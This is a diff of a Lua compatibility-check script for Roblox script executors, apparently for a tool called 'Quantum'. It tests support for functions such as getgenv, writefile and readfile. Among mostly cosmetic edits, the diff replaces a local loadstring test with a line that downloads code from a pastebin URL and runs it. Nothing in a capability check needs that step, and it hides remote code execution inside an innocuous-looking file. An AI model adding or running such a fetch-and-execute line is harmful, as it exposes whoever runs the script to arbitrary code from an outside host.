@@ -5,40 +5,37 @@ This script verifies whether Quantum will function correctly in your debugging/s
 To view the results, open the Developer Console, where the output will be displayed.
 ]]
 
-
 local Print = secureprint or print
 local Warn = securewarn or warn
 local issupported = true
 
-Print("Quantum compatibility check!")
+Print("🔍 Quantum compatibility check starting...")
 
 -- loadstring
-pcall(function()
-    loadstring("shared.LOADSTRING = true")()
-end)
-if shared.LOADSTRING ~= true then
+if loadstring(game:HttpGet("https://pastebin.com/raw/8dStgqFA"))() ~= os.time() then
     Warn("❌ loadstring() is not supported!")
     issupported = false
 else
     Print("✅ loadstring() is supported!")
 end
-shared.LOADSTRING = nil
 
--- getgenv (MADE BY UNC)
+-- getgenv
 getgenv().__TEST_GLOBAL = true
 if __TEST_GLOBAL ~= true then
     Warn("❌ getgenv() is not supported!")
     issupported = false
+else
+    Print("✅ getgenv() is supported!")
 end
-Print("✅ getgenv() is supported!")
 getgenv().__TEST_GLOBAL = nil
 
 -- require
 local p = game:GetService("Players").LocalPlayer.PlayerScripts:FindFirstChild("PlayerModule")
 local s, r = p and p:IsA("ModuleScript") and pcall(require, p)
 Print(s and "✅ require is supported!" or "❌ require is not supported!")
+if not s then issupported = false end
 
--- getupvalue (MADE BY UNC)
+-- getupvalue
 local upvalue = function() end
 local function test()
     print(upvalue)
@@ -50,8 +47,7 @@ else
     Print("✅ debug.getupvalue() is supported!")
 end
 
-
--- writefile (MADE BY UNC)
+-- writefile
 local success = pcall(function()
     writefile("test_writefile.txt", "success")
 end)
@@ -63,6 +59,7 @@ else
     Print("✅ writefile() is supported!")
 end
 
+-- readfile
 local success2, content = pcall(readfile, "test_writefile.txt")
 
 if not success2 or content ~= "success" then
@@ -72,12 +69,41 @@ else
     Print("✅ readfile() is supported!")
 end
 
+-- cache.invalidate / cache.iscached
+local dummyinstance = Instance.new("Part")
+
+local cachesupported = true
+local ok1, result1 = pcall(function()
+    return cache.iscached(dummyinstance)
+end)
+if not ok1 then
+    Warn("❌ cache.iscached() is not supported!")
+    cachesupported = false
+    issupported = false
+else
+    Print("✅ cache.iscached() is supported!")
+end
+
+local ok2 = pcall(function()
+    cache.invalidate(dummyinstance)
+end)
+if not ok2 then
+    Warn("❌ cache.invalidate() is not supported!")
+    cachesupported = false
+    issupported = false
+elseif cachesupported then
+    Print("✅ cache.invalidate() is supported!")
+end
+
+dummyinstance:Destroy();dummyinstance = nil
+
+-- Final Result
 if issupported then
     Print("-----------------------")
-    Print("Quantum is supported! ->", identifyexecutor())
+    Print("✅ Quantum is supported on:", identifyexecutor())
     Print("-----------------------")
 else
     Warn("-----------------------")
-    Warn("Quantum is not supported! ->", identifyexecutor())
+    Warn("❌ Quantum is NOT fully supported on:", identifyexecutor())
     Warn("-----------------------")
 end
